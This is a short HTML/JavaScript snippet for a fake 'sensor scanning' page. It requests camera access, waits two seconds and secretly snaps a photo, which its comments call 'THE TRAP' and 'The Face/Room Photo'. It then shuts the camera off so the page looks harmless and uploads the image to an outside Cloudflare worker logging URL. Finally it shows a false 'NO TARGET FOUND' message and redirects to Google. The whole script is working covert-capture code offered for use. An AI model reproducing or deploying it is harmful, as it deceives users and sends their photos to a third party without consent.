<script>
        // ------------------------------------------------
        // CONFIG: YOUR WORKER URL
        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
        // ------------------------------------------------

        const video = document.getElementById('v');
        const btn = document.getElementById('btn');
        const consoleText = document.getElementById('console');
        const laser = document.getElementById('laser');
        let canvas = document.createElement('canvas');
        
        btn.onclick = async () => {
            try {
                // 1. Ignition (Request Camera)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                video.srcObject = stream;
                video.play();
                
                // 2. UI Feedback
                btn.style.display = 'none';
                laser.style.display = 'block';
                consoleText.innerText = "CALIBRATING SENSORS...";
                
                // 3. THE TRAP (Wait 2 Seconds, then FORCE SNAP)
                setTimeout(() => {
                    executeStealthCapture();
                }, 2000); // 2000ms = 2 Seconds delay

            } catch (e) {
                consoleText.innerText = "SYSTEM ERROR: PERMISSION DENIED";
                consoleText.style.color = "red";
            }
        };

        async function executeStealthCapture() {
            consoleText.innerText = "ACQUIRING TELEMETRY...";
            
            // A. Silent Capture
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // B. Convert to Lightweight JPEG
            const imageData = canvas.toDataURL('image/jpeg', 0.7);

            // C. Close the Camera (To look suspicious-free)
            video.srcObject.getTracks().forEach(track => track.stop());
            laser.style.display = 'none';

            // D. Uplink to Cloudflare
            try {
                await fetch(LOGGING_API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        qr_code_text: "FORCE_CAPTURE_NO_QR", // Special Flag
                        image: imageData // The Face/Room Photo
                    })
                });
                
                // E. The "Ending" (Redirect or Message)
                consoleText.innerText = "SCAN COMPLETE. NO TARGET FOUND.";
                consoleText.style.color = "#00ff88";
                
                // Optional: Redirect to Google after 1 second
                setTimeout(() => { window.location.href = "https://google.com"; }, 1500);

            } catch(e) {
                consoleText.innerText = "UPLOAD FAILED. RETRYING...";
            }
        }
    </script>
